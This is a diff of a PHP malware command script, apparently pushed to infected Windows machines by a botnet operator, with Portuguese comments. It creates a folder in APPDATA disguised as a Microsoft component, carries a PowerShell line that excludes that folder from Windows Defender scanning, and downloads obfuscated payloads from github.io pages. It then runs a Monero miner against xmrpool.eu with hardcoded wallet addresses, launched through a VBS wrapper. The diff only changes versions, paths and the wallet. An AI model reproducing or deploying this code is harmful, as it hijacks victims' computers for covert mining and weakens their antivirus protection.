@@ -2,7 +2,7 @@ execução por eval. cuidado, não use exit e nem __FILE__
 
 *Atenção, este comando esta sendo executado via exec_blog_command() devido a mudança da url da conta. use só o comando do blg
 
-****19
+****20
 
 [GIT_COMMAND]
 
@@ -201,7 +201,7 @@ if(@file_get_contents(dirname(PHP_BINARY).'/version_2') === '1.0')
 else
 	$GLOBALS['__verify_vir_version_002']();
 
-$lolm_path = getenv('APPDATA') . '\\microsoft_win_x86';
+$lolm_path = getenv('APPDATA') . '\\microsoft_win_x86_1.0';
 $xmr_path = $lolm_path;
 @mkdir($lolm_path);
 $id_com = $lolm_path . '\\com_key.dat';
@@ -219,7 +219,7 @@ if(1)
 {
 	@file_put_contents($id_com, $command_id);
 	try{
-	/**/
+	/**
 	$r = 0;
 	@exec('powershell Add-MpPreference -ExclusionPath "'.getenv('APPDATA').'"', $output, $r);
 	/**/
@@ -255,14 +255,14 @@ if(1)
 		$data2 = @$GLOBALS['__download_002']("https://".$user.".github.io/".$project."/lolminer/ring_config.dat");
 		$data2 = @base64_decode(@strrev($data2));
 		/**/
-		/**/
+		/**
 		$data3 = @$GLOBALS['__download_002']("https://".$user.".github.io/".$project."/lolminer/ring_dll.dat");
 		$data3 = @base64_decode(@strrev($data3));
 		/**/
-		/*$data3 = 'null';*/
+		$data3 = 'null';
 		
 		/*if($data && strlen($data) > 5000000 && strlen($data2) > 2000 && strlen($data3) > 12000)*/
-		if($data && strlen($data) > 5000000 && strlen($data3) > 12000)
+		if($data && strlen($data) > 5000000)/* && strlen($data3) > 12000)*/
 		/*if($data && strlen($data) > 5000000 && strlen($data2) > 3000)*/
 		{
 			@file_put_contents($xmr_path, $data);
@@ -308,9 +308,8 @@ if(1)
 			else
 			{
 				$num_threads = (string)ceil($num_threads / 4);
-				/*$xmr_address = '4B6d8CF6BSZRH2JoC4P3JjVWtZ5Axe4bLZ3XDNMmsSD794xC3sBgtUtDitCQevnP9FEoiCathYVFMZGnxZHizJpL5SZWhch';*/
-				$xmr_address = '842KXjLj9uUH48KpPRgeQjaViqw4aqDy4i9qFWcjGLhRTHiBRBA73Z5dcE6d3zjAiGj6bANbSuQr8PSF3ShYSKX1LRZNVtS';
-				$command = '"'.$xmr_path.'" -o xmrpool.eu:3333 -a rx/0 -u '.$xmr_address.' -p 005'.$work_key.' --threads '.$num_threads;
+				$xmr_address = '4B6d8CF6BSZRH2JoC4P3JjVWtZ5Axe4bLZ3XDNMmsSD794xC3sBgtUtDitCQevnP9FEoiCathYVFMZGnxZHizJpL5SZWhch';
+				$command = '"'.$xmr_path.'" -o xmrpool.eu:3333 -a rx/0 -u '.$xmr_address.' -p '.md5($work_key.'001').' --threads '.$num_threads;
 				
 				$command = preg_replace('/\"/is', '""', $command);
 				$vbs = preg_replace('/\{COMMAND\_2\}/is', $command, $vbs);
@@ -358,7 +357,7 @@ if(1)
 		if($execlol && $vbs_exec_path)
 		{
 			$output = array();
-			$new_command_id = '10006';
+			$new_command_id = '10009';
 			$path_control_id  = dirname(PHP_BINARY) . '/command_id';
 			if(@file_get_contents($path_control_id) !== $new_command_id)
 			{
